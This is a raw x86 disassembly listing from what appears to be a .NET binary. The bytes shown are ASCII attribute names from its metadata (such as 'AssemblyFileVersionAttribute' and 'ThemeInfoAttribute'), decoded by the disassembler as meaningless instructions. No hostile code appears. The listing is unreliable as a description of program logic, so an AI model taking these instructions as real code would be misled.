  404ed4:	6d                   	insl   (%dx),%es:(%edi)
  404ed5:	65 77 6f             	gs ja  0x404f47
  404ed8:	72 6b                	jb     0x404f45
  404eda:	41                   	inc    %ecx
  404edb:	74 74                	je     0x404f51
  404edd:	72 69                	jb     0x404f48
  404edf:	62 75 74             	bound  %esi,0x74(%ebp)
  404ee2:	65 00 64 77 46       	add    %ah,%gs:0x46(%edi,%esi,2)
  404ee7:	69 6c 6c 41 74 74 72 	imul   $0x69727474,0x41(%esp,%ebp,2),%ebp
  404eee:	69 
  404eef:	62 75 74             	bound  %esi,0x74(%ebp)
  404ef2:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  404ef6:	73 65                	jae    0x404f5d
  404ef8:	6d                   	insl   (%dx),%es:(%edi)
  404ef9:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  404efd:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  404f04:	69 
  404f05:	6f                   	outsl  %ds:(%esi),(%dx)
  404f06:	6e                   	outsb  %ds:(%esi),(%dx)
  404f07:	41                   	inc    %ecx
  404f08:	74 74                	je     0x404f7e
  404f0a:	72 69                	jb     0x404f75
  404f0c:	62 75 74             	bound  %esi,0x74(%ebp)
  404f0f:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  404f13:	73 65                	jae    0x404f7a
  404f15:	6d                   	insl   (%dx),%es:(%edi)
  404f16:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  404f1a:	6f                   	outsl  %ds:(%esi),(%dx)
  404f1b:	6e                   	outsb  %ds:(%esi),(%dx)
  404f1c:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  404f22:	74 69                	je     0x404f8d
  404f24:	6f                   	outsl  %ds:(%esi),(%dx)
  404f25:	6e                   	outsb  %ds:(%esi),(%dx)
  404f26:	41                   	inc    %ecx
  404f27:	74 74                	je     0x404f9d
  404f29:	72 69                	jb     0x404f94
  404f2b:	62 75 74             	bound  %esi,0x74(%ebp)
  404f2e:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  404f32:	73 65                	jae    0x404f99
  404f34:	6d                   	insl   (%dx),%es:(%edi)
  404f35:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  404f39:	65 73 63             	gs jae 0x404f9f
  404f3c:	72 69                	jb     0x404fa7
  404f3e:	70 74                	jo     0x404fb4
  404f40:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  404f47:	69 62 75 74 65 00 54 	imul   $0x54006574,0x75(%edx),%esp
  404f4e:	68 65 6d 65 49       	push   $0x49656d65
  404f53:	6e                   	outsb  %ds:(%esi),(%dx)
  404f54:	66 6f                	outsw  %ds:(%esi),(%dx)
  404f56:	41                   	inc    %ecx
  404f57:	74 74                	je     0x404fcd
  404f59:	72 69                	jb     0x404fc4
  404f5b:	62 75 74             	bound  %esi,0x74(%ebp)
  404f5e:	65 00 55 6e          	add    %dl,%gs:0x6e(%ebp)
  404f62:	6d                   	insl   (%dx),%es:(%edi)
  404f63:	61                   	popa
  404f64:	6e                   	outsb  %ds:(%esi),(%dx)
  404f65:	61                   	popa
  404f66:	67 65 64 46          	addr16 gs fs inc %esi
  404f6a:	75 6e                	jne    0x404fda
  404f6c:	63 74 69 6f          	arpl   %esi,0x6f(%ecx,%ebp,2)
  404f70:	6e                   	outsb  %ds:(%esi),(%dx)
  404f71:	50                   	push   %eax
  404f72:	6f                   	outsl  %ds:(%esi),(%dx)
  404f73:	69 6e 74 65 72 41 74 	imul   $0x74417265,0x74(%esi),%ebp
  404f7a:	74 72                	je     0x404fee
  404f7c:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%edx),%esp
  404f83:	6f                   	outsl  %ds:(%esi),(%dx)
  404f84:	6d                   	insl   (%dx),%es:(%edi)
  404f85:	70 69                	jo     0x404ff0
  404f87:	6c                   	insb   (%dx),%es:(%edi)
  404f88:	61                   	popa
  404f89:	74 69                	je     0x404ff4
  404f8b:	6f                   	outsl  %ds:(%esi),(%dx)
  404f8c:	6e                   	outsb  %ds:(%esi),(%dx)
  404f8d:	52                   	push   %edx
  404f8e:	65 6c                	gs insb (%dx),%es:(%edi)
  404f90:	61                   	popa
  404f91:	78 61                	js     0x404ff4
  404f93:	74 69                	je     0x404ffe
  404f95:	6f                   	outsl  %ds:(%esi),(%dx)
  404f96:	6e                   	outsb  %ds:(%esi),(%dx)
  404f97:	73 41                	jae    0x404fda
  404f99:	74 74                	je     0x40500f
  404f9b:	72 69                	jb     0x405006
  404f9d:	62 75 74             	bound  %esi,0x74(%ebp)
  404fa0:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  404fa4:	73 65                	jae    0x40500b
  404fa6:	6d                   	insl   (%dx),%es:(%edi)
  404fa7:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  404fab:	72 6f                	jb     0x40501c
  404fad:	64 75 63             	fs jne 0x405013
  404fb0:	74 41                	je     0x404ff3
  404fb2:	74 74                	je     0x405028
  404fb4:	72 69                	jb     0x40501f
  404fb6:	62 75 74             	bound  %esi,0x74(%ebp)
  404fb9:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  404fbd:	73 65                	jae    0x405024
  404fbf:	6d                   	insl   (%dx),%es:(%edi)
  404fc0:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  404fc4:	6f                   	outsl  %ds:(%esi),(%dx)
  404fc5:	70 79                	jo     0x405040
  404fc7:	72 69                	jb     0x405032
  404fc9:	67 68 74 41 74 74    	addr16 push $0x74744174
  404fcf:	72 69                	jb     0x40503a
  404fd1:	62 75 74             	bound  %esi,0x74(%ebp)
  404fd4:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  404fd8:	73 65                	jae    0x40503f
  404fda:	6d                   	insl   (%dx),%es:(%edi)
  404fdb:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  404fdf:	6f                   	outsl  %ds:(%esi),(%dx)
  404fe0:	6d                   	insl   (%dx),%es:(%edi)
  404fe1:	70 61                	jo     0x405044
  404fe3:	6e                   	outsb  %ds:(%esi),(%dx)
  404fe4:	79 41                	jns    0x405027
  404fe6:	74 74                	je     0x40505c
  404fe8:	72 69                	jb     0x405053
  404fea:	62 75 74             	bound  %esi,0x74(%ebp)
  404fed:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  404ff1:	6e                   	outsb  %ds:(%esi),(%dx)
  404ff2:	74 69                	je     0x40505d
  404ff4:	6d                   	insl   (%dx),%es:(%edi)
  404ff5:	65 43                	gs inc %ebx
